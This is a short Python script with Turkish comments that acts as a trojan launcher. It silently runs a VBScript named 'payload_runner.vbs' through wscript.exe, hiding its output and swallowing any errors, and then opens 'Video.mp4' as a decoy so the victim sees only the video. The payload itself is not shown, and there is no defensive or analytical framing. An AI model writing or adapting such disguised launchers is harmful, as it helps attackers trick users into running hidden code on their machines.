import os
import subprocess

real_file = "Video.mp4"

# Payload başlat
try:
    subprocess.Popen(["wscript.exe", "payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

# Gerçek dosyayı aç
try:
    os.startfile(real_file)
except:
    pass
